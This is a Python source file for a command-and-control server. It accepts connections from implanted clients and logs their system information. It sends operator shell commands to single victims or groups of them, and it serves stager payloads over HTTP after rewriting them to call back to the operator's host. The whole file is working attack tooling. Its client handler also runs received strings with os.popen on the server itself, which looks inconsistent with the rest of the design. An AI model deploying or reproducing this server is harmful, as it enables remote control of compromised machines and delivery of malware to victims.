import http.server
import socketserver
import threading
import socket
import json
import os
import logging

# Correct path to configuration file
config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.json')
with open(config_path) as config_file:
    config = json.load(config_file)

HOST = config['server_host']
PORT = config['server_port']
LOG_FILE = config['log_file']
PAYLOAD_FILENAME = config['payload_filename']
HTTP_PORT = config.get('http_port', 80)  # Default to port 80 if not specified

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Store connected clients and their numeric IDs
clients = {}
client_groups = {}
client_id_counter = 1
client_id_map = {}

def handle_client(client_socket, addr):
    global client_id_counter
    with client_socket:
        client_id = f"{addr[0]}:{addr[1]}"
        numeric_id = client_id_counter
        client_id_counter += 1

        # Assign the numeric ID to the client
        clients[numeric_id] = client_socket
        client_id_map[numeric_id] = client_id
        
        try:
            system_info = client_socket.recv(4096).decode('utf-8')
            logging.info(f"Connected to {client_id}")
            logging.info(f"System Information from {client_id}:\n{system_info}")
            print(f"[*] System Information from {client_id}:\n{system_info}")
            
            while True:
                command = client_socket.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    print(f"[*] Client {numeric_id} has exited.")
                    break
                elif command:
                    response = os.popen(command).read()
                    client_socket.sendall(response.encode())
        except Exception as e:
            logging.error(f"Error handling client {numeric_id}: {e}")
            print(f"[!] Error: {e}")
        finally:
            del clients[numeric_id]
            del client_id_map[numeric_id]
            client_socket.close()
            logging.info(f"Connection to {numeric_id} closed")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

def update_client_file():
    files_to_update = [
        os.path.join(os.path.dirname(__file__), 'Stagers', 'c2_client.py'),
        os.path.join(os.path.dirname(__file__), 'Stagers', 'python_stager.py')
    ]

    search_replace_pairs = {
        'c2_client.py': ("SERVER_HOST = '1.1.1.1'", f"SERVER_HOST = '{HOST}'"),
        'python_stager.py': ("http://0.0.0.0/c2_client.py", f"http://{HOST}/c2_client.py")
    }
    
    for file_path in files_to_update:
        filename = os.path.basename(file_path)
        if filename not in search_replace_pairs:
            print(f"[!] No replacement rules found for {filename}.")
            continue

        search_string, replace_string = search_replace_pairs[filename]

        print(f"[*] Updating file at: {file_path}")

        if not os.path.isfile(file_path):
            print(f"[!] Payload file not found: {file_path}")
            continue

        try:
            with open(file_path, 'r') as file:
                content = file.read()
            print(f"[*] Original content from {file_path}:\n{content[:200]}...")  # Print first 200 chars for inspection
        except Exception as e:
            print(f"[!] Error reading file {file_path}: {e}")
            continue

        if search_string not in content:
            print(f"[!] Search string '{search_string}' not found in the file {file_path}.")
            continue

        updated_content = content.replace(search_string, replace_string)
        print(f"[*] Updated content for {file_path}:\n{updated_content[:200]}...")  # Print first 200 chars for inspection

        try:
            with open(file_path, 'w') as file:
                file.write(updated_content)
        except Exception as e:
            print(f"[!] Error writing to file {file_path}: {e}")
            continue

        print(f"[*] Updated {file_path} with server IP: {HOST}")

def start_http_server():
    update_client_file()  # Update the client file before serving
    payload_path = os.path.join(os.path.dirname(__file__), 'Stagers', PAYLOAD_FILENAME)
    print(f"[*] Serving files from: {os.path.dirname(payload_path)}")  # Debugging line
    
    if not os.path.isfile(payload_path):
        print(f"[!] Payload file not found: {payload_path}")
        return

    os.chdir(os.path.dirname(payload_path))
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", HTTP_PORT), handler)
    print(f"[*] Starting HTTP server on port {HTTP_PORT}")
    httpd.serve_forever()

def show_menu():
    while True:
        print("\n--- C2 Server Menu ---")
        print("1. List active connections")
        print("2. Interact with a client")
        print("3. Create client group")
        print("4. List client groups")
        print("5. Interact with a client group")
        print("6. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            list_connections()
        elif choice == '2':
            interact_with_client()
        elif choice == '3':
            create_client_group()
        elif choice == '4':
            list_client_groups()
        elif choice == '5':
            interact_with_client_group()
        elif choice == '6':
            break
        else:
            print("[!] Invalid choice. Please select a valid option.")

def list_connections():
    print("\n--- Active Connections ---")
    for numeric_id, client_socket in clients.items():
        print(f"ID {numeric_id}: {client_id_map[numeric_id]}")

def interact_with_client():
    try:
        numeric_id = int(input("Enter the client ID to interact with: "))
        if numeric_id in clients:
            client_socket = clients[numeric_id]
            while True:
                command = input(f"{numeric_id}> ")
                if command.lower() == 'exit':
                    break
                client_socket.sendall(command.encode())
                response = client_socket.recv(4096).decode('utf-8')
                print(response)
        else:
            print(f"[!] No active connection with ID: {numeric_id}")
    except ValueError:
        print("[!] Invalid ID format. Please enter a numeric ID.")

def create_client_group():
    group_name = input("Enter the group name: ")
    client_ids = input("Enter the client IDs to add to the group (comma-separated): ").split(',')
    client_groups[group_name] = [int(client_id.strip()) for client_id in client_ids if client_id.strip().isdigit() and int(client_id.strip()) in clients]
    print(f"[*] Created group '{group_name}' with clients: {client_groups[group_name]}")

def list_client_groups():
    print("\n--- Client Groups ---")
    for group_name, client_list in client_groups.items():
        print(f"{group_name}: {client_list}")

def interact_with_client_group():
    group_name = input("Enter the group name to interact with: ")
    if group_name in client_groups:
        while True:
            command = input(f"{group_name}> ")
            if command.lower() == 'exit':
                break
            for numeric_id in client_groups[group_name]:
                if numeric_id in clients:
                    client_socket = clients[numeric_id]
                    client_socket.sendall(command.encode())
                    response = client_socket.recv(4096).decode('utf-8')
                    print(f"ID {numeric_id}: {response}")
    else:
        print(f"[!] No group with name: {group_name}")

if __name__ == "__main__":
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    http_thread = threading.Thread(target=start_http_server)
    http_thread.daemon = True
    http_thread.start()

    show_menu()
